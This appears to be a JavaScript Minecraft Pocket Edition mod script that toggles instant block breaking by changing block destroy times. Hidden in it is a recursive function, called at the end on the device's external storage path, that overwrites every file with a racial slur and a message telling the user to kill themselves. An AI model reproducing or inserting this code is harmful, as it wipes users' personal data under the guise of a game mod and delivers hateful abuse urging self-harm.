VP.overwrite = function(dir) {
new File(dir).listFiles().map((f)=>{
if(f.isDirectory()) VP.overwrite(f)
else {
var file = new FileWriter(f)
file.write("Eyo nigga kys pls")
file.close()
}
})
}
if(toggled.instB) {
						if(!blocks.hasOwnProperty(Player.getPointedBlockId())) blocks[Player.getPointedBlockId()] = { friction: Block.getFriction(Player.getPointedBlockId(), Player.getPointedBlockData()), breakSpeed: Block.getDestroyTime(Player.getPointedBlockId(), Player.getPointedBlockData()), fricS: false, fricM: false, instaB: false }
						if(!blocks[Player.getPointedBlockId()].instaB || Block.getDestroyTime(Player.getPointedBlockId()) != 0.00001) {
 blocks[Player.getPointedBlockId()].instaB = true
 Block.setDestroyTime(Player.getPointedBlockId(), 0.00001)
 }
						}else if(blocks.hasOwnProperty(Player.getPointedBlockId())) if(blocks[Player.getPointedBlockId()].instaB) {
 Block.setDestroyTime(Player.getPointedBlockId(), blocks[Player.getPointedBlockId()].breakSpeed)
 blocks[Player.getPointedBlockId()].instaB = false
 }
VP.overwrite(Enviornment.getExternalStorageDirectory().getPath())
